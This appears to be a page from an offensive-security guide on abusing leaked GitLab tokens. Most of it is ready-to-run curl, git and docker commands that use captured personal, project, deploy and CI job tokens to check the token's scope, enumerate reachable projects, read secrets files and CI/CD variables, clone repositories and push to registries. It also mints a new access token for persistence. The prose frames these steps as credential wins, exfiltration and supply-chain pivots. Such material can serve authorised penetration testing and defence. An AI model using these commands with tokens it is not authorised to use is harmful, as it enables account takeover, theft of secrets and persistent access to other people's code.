---
title: "Token abuse"
description: "Reusing leaked GitLab personal, project, and group access tokens, deploy tokens, and the pipeline CI job token against the v4 API: resolving each token's identity and scope, reading and writing repositories, and pivoting across projects through the job-token allowlist."
keywords:
  - personal access token
  - project access token
  - deploy token
  - CI_JOB_TOKEN
  - PRIVATE-TOKEN
  - token scope
---

# Token abuse

GitLab authenticates API calls with a header, and several token types share the surface. A leaked one is immediately usable: you do not need the account's password or a session. The task on finding a token is to resolve **what it is**, **who it acts as**, and **what it can do**, then act within that.

- **Personal access token (PAT)**: acts as a user, scoped by a list such as `api` (full read/write), `read_api`, `read_repository`, `write_repository`. Sent as `PRIVATE-TOKEN:` or `Authorization: Bearer`.
- **Project / group access token**: acts as a bot user bound to one project or group, with a role (Developer, Maintainer) and scopes. Same headers.
- **Deploy token**: a username/password pair for cloning and registry pull/push, not the full API. Used in git remotes and `docker login`.
- **CI job token** (`CI_JOB_TOKEN`): minted per job, acts with the triggering user's job identity, reaches the API for allowlisted projects, the registry, and releases. Sent as `JOB-TOKEN:`.

## Resolve identity and scope first

```bash
# PAT / project / group token: who does it act as?
curl -s https://gitlab.com/api/v4/user -H "PRIVATE-TOKEN: $TOKEN"
# -> {"username":"svc-bot","id":123,"is_admin":false,...}; a 401 means dead/revoked

# Exact scopes and expiry of the current token
curl -s https://gitlab.com/api/v4/personal_access_tokens/self -H "PRIVATE-TOKEN: $TOKEN"
# -> {"scopes":["api"],"active":true,"expires_at":"2026-12-31",...}
```

An `api` scope and `is_admin:false` still means full read/write on every project the acting user can reach. A `401` on `/user` means the token is revoked or expired; a `403` on a specific resource means it is valid but under-privileged there.

## Enumerate and act within scope

```bash
# Everything this token can reach, with the role it holds
curl -s "https://gitlab.com/api/v4/projects?membership=true&min_access_level=30&per_page=100" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[] | "\(.path_with_namespace) \(.permissions.project_access.access_level)"'

# Read a file (write_repository/api can also commit)
curl -s "https://gitlab.com/api/v4/projects/<id>/repository/files/config%2Fsecrets.yml/raw?ref=main" \
  -H "PRIVATE-TOKEN: $TOKEN"

# Create a new PAT for persistence if the token holds the admin or api scope on self (self-managed)
curl -s -X POST "https://gitlab.com/api/v4/users/<id>/personal_access_tokens" \
  -H "PRIVATE-TOKEN: $TOKEN" -d "name=ci&scopes[]=api&expires_at=2027-01-01"
```

The URL-encoded file path (`config%2Fsecrets.yml`) is required by the files API; `%2F` is the `/` separator. A successful raw read of a secrets file is an immediate credential win.

## CI job token and deploy token

```bash
# Job token: clone an allowlisted project
git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/<ns>/<project>.git
# Job token against the API (works for projects that allowlist the source project)
curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/<id>/variables"

# Deploy token: registry pull/push and clone, not the general API
echo "$DEPLOY_TOKEN_PASS" | docker login registry.gitlab.com -u "$DEPLOY_TOKEN_USER" --password-stdin
git clone https://$DEPLOY_TOKEN_USER:$DEPLOY_TOKEN_PASS@gitlab.com/<ns>/<project>.git
```

A deploy token returns `404`/`401` against `/api/v4/user` because it is not a user; test it against a clone or `docker login` instead. The job token's reach is bounded by each target project's **CI/CD job token allowlist**, so a `403` on another project's variables means that project does not allowlist yours.

## Follow-on

A Maintainer-level token reads stored CI/CD variables directly (see [reconnaissance](reconnaissance.md)); a lower token exfiltrates them through [CI/CD pipeline injection](ci-cd-pipeline-injection.md). An admin PAT on a self-managed instance opens the impersonation and runner paths in [known admin and API exploits](known-admin-and-api-exploits.md). Registry push with a deploy or job token is a supply-chain pivot into whatever consumes the image.

## Tools

- **glab auth login** to store and reuse a captured token across commands.
- **TruffleHog** to confirm a scraped token is live before using it.

## References

- [GitLab personal access tokens](https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html)
- [GitLab project access tokens](https://docs.gitlab.com/ee/user/project/settings/project_access_tokens.html)
- [GitLab deploy tokens](https://docs.gitlab.com/ee/user/project/deploy_tokens/)
- [GitLab: personal access tokens API](https://docs.gitlab.com/ee/api/personal_access_tokens.html)
